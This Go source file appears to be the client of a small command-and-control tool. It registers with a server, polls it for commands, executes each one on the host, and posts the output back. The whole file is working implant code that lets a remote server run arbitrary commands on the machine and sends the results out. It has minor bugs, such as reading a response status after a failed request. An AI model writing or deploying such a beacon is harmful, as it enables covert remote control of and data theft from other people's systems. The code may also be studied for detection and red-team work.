package client

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os/exec"
	"strings"
	"time"

	"github.com/quietjoy/gocom/pkg/models"
	"github.com/quietjoy/gocom/pkg/utils"
)

func RunClient(serverConnection *string) {
	// register the client with the server
	clientUUID := registerClient(serverConnection)
	log.Println("Registration Complete. Starting client loop...")
	for {
		// Generate random number between 1 and 10 for jitter in command execution
		jitter := utils.ExpontentialBackoff(rand.Intn(15-3) + 3)

		// generate url to get command from server
		clientURL := fmt.Sprintf("http://%s/%s/commands", *serverConnection, clientUUID)
		log.Println(fmt.Sprintf("Getting command from server: %s", clientURL))
		// Get the commands for this client
		resp, err := http.Get(clientURL)
		if err != nil {
			log.Println(err)
		} else {
			bodyBytes, err := io.ReadAll(resp.Body)
			if err != nil {
				log.Println(fmt.Sprintf("Error reading response body: %s. Sleeping for %d milliseconds", err, (jitter / time.Millisecond)))
				time.Sleep(time.Duration(jitter))
				continue
			}
			bodyString := string(bodyBytes)
			logStatement := fmt.Sprintf("Response status: %s, Response body: %s", resp.Status, bodyString)
			log.Println(logStatement)

			// Get the list of commands from the response body
			var commands []models.ControlCommand
			json.Unmarshal(bodyBytes, &commands)

			// Iterate through the commands and execute them
			for _, command := range commands {

				// Execute the command
				var cmd *exec.Cmd
				// check if arguments are an empty string
				if strings.TrimSpace(command.Arguments) == "" {
					cmd = exec.Command(command.Command)
				} else {
					cmd = exec.Command(command.Command, command.Arguments)
				}

				var out bytes.Buffer
				cmd.Stdout = &out
				commandError := cmd.Run()

				// convert the command ID to a string
				commandID := fmt.Sprintf("%d", command.ID)

				// generate url to send command output to server
				commandURL := fmt.Sprintf("http://%s/%s/%s", *serverConnection, clientUUID, commandID)

				// log the url to send the command output to
				log.Println("Sending command output to server: " + commandURL)

				// Send the command output to the server
				if commandError != nil {
					log.Println("Command error: " + commandError.Error())

					resp, err := http.Post(fmt.Sprintf("%s/%s", commandURL, "error"), "application/json", bytes.NewBuffer([]byte(commandError.Error())))
					if err != nil {
						log.Println(fmt.Sprintf("Error sending command error to server: %s", err))
					}
					log.Println(fmt.Sprintf("Command error response status: %s", resp.Status))
				} else {
					resp, err := http.Post(fmt.Sprintf("%s/%s", commandURL, "success"), "application/json", &out)
					if err != nil {
						log.Println(fmt.Sprintf("Error sending command output to server: %s", err))
					}
					log.Println(fmt.Sprintf("Command output response status: %s", resp.Status))
				}
			}
		}

		log.Println(fmt.Sprintf("Sleeping for %d milliseconds", (jitter / time.Millisecond)))
		//time.Sleep(jitter)
		time.Sleep(1 * time.Second)
	}
}

// Register the client with the server and get the client ID
func registerClient(serverConnection *string) string {
	registerClientAttempts := 0
	clientID := ""
	for registerClientAttempts < 1000 {
		log.Println("Registering client with server...")
		// register the client with the server and get client ID
		resp, err := http.Post(fmt.Sprintf("http://%s/register", *serverConnection), "application/json", bytes.NewBuffer([]byte("Client registration")))
		if err != nil {
			registerClientAttempts++
			sleepTime := utils.ExpontentialBackoff(registerClientAttempts)
			log.Println(fmt.Sprintf("Error registering client. Try again later in %d millisends. Error: %s", (sleepTime / time.Millisecond), err))
			time.Sleep(sleepTime)
			continue
		}
		// Get the client ID from the response
		bodyBytes, err := io.ReadAll(resp.Body)

		clientID = string(bodyBytes)
		// Trim newlines and whitespace
		clientID = strings.TrimSpace(clientID)
		// Remove quotes from the client ID
		clientID = strings.Trim(clientID, "\"")

		log.Println(fmt.Sprintf("Client ID: %s", clientID))
		if clientID == "" {
			sleepTime := utils.ExpontentialBackoff(registerClientAttempts)
			log.Println(fmt.Sprintf("No client ID received. Try again later in %d milliseconds.", (sleepTime / time.Millisecond)))
			time.Sleep(sleepTime)
			continue
		}

		// If we made it this far, we have a client ID
		break
	}

	log.Println(fmt.Sprintf("Successfully registered client with server. Client ID: %s", clientID))
	return clientID
}
